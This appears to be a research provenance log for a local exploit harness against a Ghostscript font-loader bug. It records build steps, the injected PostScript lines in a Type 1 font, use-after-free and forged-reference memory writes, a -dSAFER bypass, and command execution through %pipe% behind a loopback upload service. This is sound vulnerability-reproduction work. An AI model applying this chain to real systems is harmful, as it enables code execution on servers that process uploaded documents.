# PROVENANCE — ghostscript2shell frontier harness

CVE-2026-125396 / "Upload2Shell". Claim sources and source-bound mechanism:
`reports/frontier-ghostscript.md`. All work local; no network probe, no service,
no off-loopback contact. Fetching source/advisories is provisioning.

## Pinned blobs (`src/SHA256SUMS`)

| File | Origin | SHA-256 |
|---|---|---|
| `gs_fonts.ps.ghostpdl-10.07.0` | `https://raw.githubusercontent.com/ArtifexSoftware/ghostpdl/ghostpdl-10.07.0/Resource/Init/gs_fonts.ps` | `844ca0cb12eccd32876d938eef42288cd17e9ab79b91f7dec6bb7ded1a9c3233` |
| `gs_fonts.ps.ghostpdl-10.07.1` | tag `ghostpdl-10.07.1` (byte-identical) | `844ca0cb12eccd32876d938eef42288cd17e9ab79b91f7dec6bb7ded1a9c3233` |
| `gs_fonts.ps.1484854e` | fix commit `1484854e0c8ddfda1baa4ad4cd965b8a9790aa81` | `1ad111af10bcce10f1c2fe0162c934121d4cfb7265dc44aa8df6a07815f02d34` |
| `fix-1484854e.patch` | `https://github.com/ArtifexSoftware/ghostpdl/commit/1484854e... .patch` | `8a279018297ebd71cea1e008f9de0ff411a70b718c5657de29eae1cdc6637073` |
| `ghostpdl-10.07.0.tar.gz` | `https://codeload.github.com/ArtifexSoftware/ghostpdl/tar.gz/refs/tags/ghostpdl-10.07.0` | `6e7c0c61c8dfcd6b0a0b6aeebebe7d62868d42e42b9b8b77daf44a2ae0e6529a` |

The tarball's bundled `Resource/Init/gs_fonts.ps` hashes to the vulnerable pin,
so the tested interpreter resource is shipped tag bytes, not a reconstruction.
The fix patch touches only `Resource/Init/gs_fonts.ps`.

## Build

```
cd src
curl -fL -o ghostpdl-10.07.0.tar.gz \
  https://codeload.github.com/ArtifexSoftware/ghostpdl/tar.gz/refs/tags/ghostpdl-10.07.0
tar xzf ghostpdl-10.07.0.tar.gz            # -> ghostpdl-ghostpdl-10.07.0
cd ghostpdl-ghostpdl-10.07.0
./autogen.sh                                # configure generated; its X11 probe fails, harmless
./configure --without-x --disable-cups
make -j2 gs                                 # bin/gs, version 10.07.0
# vulnerable binary:
cp bin/gs ../../harness/bin/gs-vuln
# fixed binary: swap ONLY the resource, rebuild, copy, restore
cp gs_fonts.ps.1484854e Resource/Init/gs_fonts.ps
make -j2 gs
cp bin/gs ../../harness/bin/gs-fixed
cp gs_fonts.ps.ghostpdl-10.07.0 Resource/Init/gs_fonts.ps
make -j2 gs                                 # tree back to vulnerable pin
```

`gs-vuln` sha256 `59e8c548cf6d32d2f407b5d2ecb6fb3bb2e3744622d368c6fb67f0d852031ed1`.
`gs-fixed` sha256 `0f3c962cd3ef12fd975786b4ced3ebe89291ce831163b816e495419fa4d6167f`.
Resource baked into ROMFS: `-I` cannot override it; a rebuild is the only
reliable fixed control. Both binaries report `10.07.0`.

## Font fixtures

`harness/font-injected.pfa` derives from
`/usr/share/fonts/X11/Type1/NimbusSans-Regular.pfb` converted with the shipped
`ghostpdl-10.07.0/lib/pfbtopfa`:

```
./bin/gs -P- -q -dNODISPLAY -dNOSAFER -- ./lib/pfbtopfa.ps \
  /usr/share/fonts/X11/Type1/NimbusSans-Regular.pfb nimbus.pfa
```

Four lines were injected after the leading comments, before `10 dict begin`:

```
(DEPTH2_BEFORE=) print 2 index type == flush
3 -1 roll pop
[ 31337 4242 5151 ]
3 1 roll
(DEPTH2_AFTER=) print 2 index type == flush
(GS_SURGERY_DONE count=) print count == flush
```

The `DEPTH2_*` and `GS_SURGERY_DONE` prints are measurement scaffolding, not
part of the exploit primitive; they are left in the vendored fixture so the
harness can assert the loader stack was actually altered. `font-safe.pfa` is
the same PFA with no injected lines.

- `font-injected.pfa` sha256 `ef164da0c9db3fa84ea2f5494dfc856c22fd65752336a48dbf24224ec386b1fa`
- `font-safe.pfa` sha256 `85649a2b1b2f86df9addfe0ccc27ae48ec2ea6ee1815e180a33d73d062b2a4c6`
- `rung1.ps` sha256 `8d83df9aad539d30a6942f4d618bef0411c17759b0d0fa05d396d7b952dbd062`

## Model boundaries

Real interpreter, real Type 1 font loader, real bound helper, real `.forceput`.
Not a C slice over stubs. `systemdict` is a genuinely readonly global dict;
the observed write is a privileged store performed by the interpreter's own
`.forceput`, with the writeup's five-pop `/typecheck` handler. This section
records the baseline rung-1/2 finding only. Later sections supersede its
ceiling: a local object was stored into a surviving global dict and a UAF was
demonstrated (rung 4), an ASan build confirmed the corruption (rung 3), and
native pointer-chain writes plus a state-level `-dSAFER` flip were measured.
The fixed control changes only the shipped `gs_fonts.ps` operand-type guard.
Still absent: any `%pipe%` command, benign command execution, or network /
application delivery — rung 5 remains a separate claim.

## Verification

`cd harness && ./run.sh` → 22 PASS / 0 FAIL, three identical runs and a clean
minimal `/tmp` replay; normalized trace
`a4569485cb1fb98ab74b7d186e1566f18ede6bdb263cdb4e5e34f631e5683c29`.
Raw outputs in `harness/evidence/`.

## Rung-4 UAF aliasing — 2026-11-23 first mind wake

Writeup `https://pwn.ai/upload2shell/research.html` (fetched 2026-11-23)
describes a marker scan over many fresh allocations, not a single reuse.
`psi/zgeneric.c:270-312` confirms `zforceput` temporarily sets systemdict's
ref space to `avm_local` around `idict_put`, so a local object genuinely
enters a dict that survives `restore`.

Diagnostic `exp/uaf-diag.ps`: a local 2048-byte string force-put into
systemdict is still `stringtype`, length 2048, byte0=65 after `restore`
(`AFTER_RESTORE_KNOWN=true`, `AFTER_RESTORE_TYPE=stringtype`,
`AFTER_RESTORE_LEN=2048`, `AFTER_RESTORE_0=65`). The handoff's
`UAF_READ=null` was a failed single 8-array reuse, not ref nulling.

Canonical probe `harness/uaf.ps` + `harness/run-uaf.sh`: vulnerable build +
injected font stores the local string, restores, allocates 96 arrays of 128
integers each holding `0x12345678`, scans the stale string for byte run
`78 56 34 12`, flips one low byte to `0x79`, and observes exactly one live
array element change. Reverse direction confirmed: writing `0x1234567a` to
that live element reads back as `122,86,52,18` through the stale string, and
cleanup restores byte `120`. Deterministic 5/5 and across 3 harness runs:
array 8 / index 118, first pattern offset 8, 10 pattern occurrences.

- `gs-vuln` + injected font: all rung-4 assertions PASS.
- `gs-fixed` + injected font: `SV_PRESENT=false`, `NO_STALE_REF` — guard blocks.
- `gs-vuln` + safe font: `SV_PRESENT=false`, `NO_STALE_REF` — no trigger.

`./run-uaf.sh` → 21 PASS / 0 FAIL three times; normalized trace
`bd4e4b4c7404a9b22dbda6e3ee077e58736d96a868af6f2aad8cc7a00f85a7cb`.
Raw outputs in `harness/evidence/uaf-*.out`. `uaf.ps` sha256
`34b6abffe3ed28648b57872b67d4ee91726d767e52ba1773dde2f2630b9eba8e`.

Honest ceiling: PostScript-level rung 4 — chosen bytes at a chosen offset in
a live interpreter object via a dangling reference, with vulnerable and two
negative controls. No native address, no ASan report, no forged ref, no
pointer-chain walk, no `path_control_active` write, no `-dSAFER` bypass, no
command, no application/network chain. The handoff `UAF_READ=null` negative
is preserved as the failed single-reuse hypothesis.

## ASan confirmation — 2026-11-23 (rung 3)

Built a third binary from the same pinned tree, out-of-tree in `src/asan-build`
with `CFLAGS='-fsanitize=address -g -O1' LDFLAGS='-fsanitize=address'`,
`../ghostpdl-ghostpdl-10.07.0/configure --without-x --disable-cups` and
`make -j2 gs`. 1016 compile commands carry `-fsanitize=address`; 39 `__asan_*`
symbols. `harness/bin/gs-vuln-asan` sha256
`7ee7b87ec079bfafcc17e994b9fb57a496143eff6bd6d9011f9d48eddc12fc20`
(108,852,384 bytes). A fixed control `gs-fixed-asan` was built by swapping only
`Resource/Init/gs_fonts.ps` to `gs_fonts.ps.1484854e`, rebuilding and
restoring the source tree to the vulnerable pin (`844ca0cb...`).

`harness/uaf.ps` on `gs-vuln-asan` (`harness/evidence/uaf-asan-vuln-injected.out`,
sha256 `d3adbb8caef37beac5745b174874bd75c6108a45612651725899693940c33387`,
`ASAN_OPTIONS=detect_leaks=0`) reports:
`ERROR: AddressSanitizer: heap-use-after-free`, `READ of size 1` in `zget` at
`psi/zgeneric.c:183`, 14792 bytes inside a 20048-byte region allocated by
`gs_heap_alloc_bytes` (`base/gsmalloc.c:192`) and freed by
`gs_heap_free_object` (`base/gsmalloc.c:366`). This is an instrumented report
on the stale systemdict string — rung 3 (confirmed memory corruption), not a
bare crash.

`gs-fixed-asan` + injected font: `SV_PRESENT=false`, `NO_STALE_REF`, rc 0, no
ASan report (`harness/evidence/uaf-asan-fixed-injected.out`). No absolute
address was guessed; no native pointer chain, forged ref, `-dSAFER` bypass or
command was exercised.

## Preserved negatives

- Host gs 10.02.1 is patched and hides `.forceput`, `.forcebind`,
  `.currentglobal`, `.undefinternalnames`; direct-call harness impossible.
- `-I` resource override loses to ROMFS; fixed control needs a rebuild.
- Wrong first stack-surgery rolls (`2 1 roll`) left the filename a string.
- Naive save/restore UAF probe: `STALE_KEY=true`, `UAF_READ=null` — a single
  fresh `8 array` did not reuse the freed block; later marker scan found
  aliasing with 96 fresh arrays (see rung-4 section).
- Initial local `-dSAFER` probe showed no cleartext and no stale ref. Cause was
  later isolated: SAFER requires `--permit-file-read=<font path>`; without it
  Ghostscript falls back to a built-in font and the injected cleartext never
  runs. With the permission, the full primitive fires under `-dSAFER` (below).
- ASan exercised (rung 3). Native ref forging, a benign path-control write and
  a state-level `-dSAFER` boundary flip were exercised (below). No command, no
  application/network chain, no rung 5.

## Native rung-4 mechanics — 2026-11-23 first mind wake (option 3)

Both charter preconditions held (aliasing + ASan report), so the writeup's
native chain was attempted at PostScript level on `gs-vuln`, `-dNOSAFER`.

Byte arithmetic note: this build's `bitshift` truncates integers above 32 bits
(verified: `105251546305479 8 bitshift 255 and` yields 0, while `idiv` yields
the correct byte). All ref-byte assembly therefore uses `idiv`/`mul`.

`exp/native-selftest.ps` first validated the forge technique: rewriting an
aliased slot's ref with a captured writable-string header and its own data
pointer round-trips the pointer and reads `BYTE0=72`, `BYTE1=69` from the
resulting view (`HELLO_WORLD_16CHR`).

`exp/native-chain.ps` walks live pointers without guessing an absolute address:
`currentdevice` ref value → `GXDEVICE` (+0) → `MEM` (`gx_device+24`) →
`LIBCTX` (`gs_memory_t+208`) → `CORE` (`gs_lib_ctx+8`). A forged 4-byte view at
`CORE+156` reads `PATH_CONTROL_BYTES=0` under `-dNOSAFER`, then a benign write
sets it to `1` (`PSTATE_WRITTEN=1`), `.currentpathcontrolstate` returns `true`,
and the original bytes are restored (`PSTATE_RESTORED=0`). The aliased slot is
restored to its integer ref (`CLEAN_VALUE=12345`). 3/3 stable.

`exp/native-dispatch.ps` retargets one ref: captures `systemdict /mul get`'s
16 ref bytes, swaps only the 8 implementation-pointer bytes for `sub`'s,
invokes that ref once and observes `BEFORE=319`, `CHANGED=18` (29-11),
`AFTER=319` after restoration. No systemdict entry is modified. 3/3 stable.

`harness/run-native.sh` + evidence `native-*.out`: 17 PASS / 0 FAIL three
times, trace `b53abad21ed9822838d2a5f85a705172c3c19cb9ea22923b141c90192b682e87`.
Fixed-resource control on both probes: `NO_STALE_REF`, no chain, no dispatch
change.

Honest ceiling for this section: native reads/writes through forged refs with a
benign marker and an observed interpreter state change — rung-4 mechanics. No
absolute process address guessed, no `%pipe%` command, no application/network
chain, no witness verdict. The `-dSAFER` result is recorded separately below.

## Native control under -dSAFER — same wake

The initial `-dSAFER` negative was a permission artifact. With
`--permit-file-read=<absolute font path>`, the injected cleartext executes under
`-dSAFER` and `harness/uaf.ps` shows the full aliasing (`SV_PRESENT=true`,
`D1_HIT=true`, bidirectional read-back). `exp/native-chain-safer.ps` then walks
the same pointer chain and performs the writeup's benign `path_control_active`
`1 -> 0` write through a forged 4-byte view:

- `PATH_CONTROL_BYTES_BEFORE=1`, `PATH_CONTROL_OPERATOR_BEFORE=true`
- native write of four zero bytes
- `PATH_CONTROL_BYTES_AFTER=0`, `PATH_CONTROL_OPERATOR_AFTER=false`
- `PATH_CONTROL_BYTES_RESTORED=1`, `CLEAN_VALUE=12345`

3/3 stable; `gs-fixed` with the same SAFER permission gives `NO_STALE_REF`.
`harness/run-safer.sh`: 9 PASS / 0 FAIL three times; evidence
`harness/evidence/safer-chain*.out`, probe sha256
`f22acdea7bfcfefc842e3e201181da1223b0b15b309626ad5701b5bdc0e45d96`.

This is a measured state-level `-dSAFER` boundary flip on the vulnerable build,
not a command execution: no `%pipe%`, no `PermitFileWriting` manipulation, no
benign command, no application or network delivery, no witness verdict. Rung 5
remained a separate claim at that point; the loopback HTTP command chain is
recorded in the next section.

## Rung-5 lab chain over loopback HTTP — 2026-11-23T05:1xZ wake

Preserved negative first: my initial hypothesis was that `-dSAFER` blocks
`%pipe%` through `i_ctx_p->LockFilePermissions` (`psi/zfile.c:1005`). A forged
write to `i_ctx_p+196` (offsets from ASan-build DWARF) cleared that field and
`currentuserparams /LockFilePermissions get` returned false, but `%pipe%` stayed
blocked (`PIPE_FAILED=true`, no marker). In this build that userparam already
reads false under both SAFER and NOSAFER, so it is not the live gate.

The actual gate is `pipe_fopen`: it calls `gp_validate_path` on both `%pipe%…`
and `|…` (`base/gdevpipe.c:89-97`), and `gp_validate_path` returns 0 as soon as
`gs_lib_ctx.core->path_control_active == 0` (`base/gpmisc.c:1049-1050`). The
rung-4 forged-ref write to `CORE+156` is therefore sufficient. Artifacts:

- `exp/command-safer.ps` (sha256
  `66cc77fb2f354f67ac46d6b94a1533fa2db0dad67b7ddb855671a63604b67fc8`): the
  existing UAF/forged-ref chain clears `path_control_active`, opens
  `%pipe%/bin/sh -c "echo GS_R5_OK > <marker>"` and restores native state and
  the aliased slot. Font and marker paths arrive via `-sR5_FONT_PATH` and
  `-sR5_MARKER_PATH`, with direct-run defaults.
- `live/r5_server.py` and `live/r5_request.py`: a lab-only service bound to
  127.0.0.1 that accepts attacker-controlled document+font bytes in a JSON POST
  to `/upload`, saves them under a per-request upload directory, and spawns the
  lab gs on the saved document with `-dSAFER` and
  `--permit-file-read=<upload>/*`. A bare directory permit without `/*` was
  tried first and gave `NO_STALE_REF` because the saved font was not readable;
  that negative is preserved. The app's binary, marker path and upload root are
  harness environment, never request-controlled.
- `harness/run-r5.sh`: runs three cases through real HTTP on the loopback:
  vulnerable gs + injected font, fixed `1484854e` gs + injected font, and
  vulnerable gs + unmodified font. Evidence `harness/evidence/r5-*.norm`.

Vulnerable + injected: `RC=0`, `PATH_CONTROL_BYTES_BEFORE=1`,
`PATH_CONTROL_BYTES_AFTER=0`, `PIPE_OPENED=true`,
`PATH_CONTROL_BYTES_RESTORED=1`, `CLEAN_VALUE=12345`, and the marker file
contains `GS_R5_OK` — a lab-chosen command with an observed side effect from
wire-delivered bytes. Both controls give `NO_STALE_REF` and `MARKER=NONE`.
`PASS=14 FAIL=0` three consecutive runs, normalized trace
`ddd635b2e607150af1180cc07554183ac79fd1025a79c00af28fbf923bf09957`.

Honest ceiling: this is rung 5 at the deliberately permissive lab-app scope —
the app explicitly permits the upload directory and templates the saved paths
into the gs command line. It does not demonstrate the writeup's CUPS,
Roundcube, WordPress, MediaWiki or DokuWiki delivery chains, does not change
the CVE's AV:L vector, uses no external host or public target, and has no
witness replay yet. The command is benign (`echo` into a marker file); no
interactive shell, persistence, credential access or data exfiltration was
attempted. ESTABLISHED still requires independent witness replay.
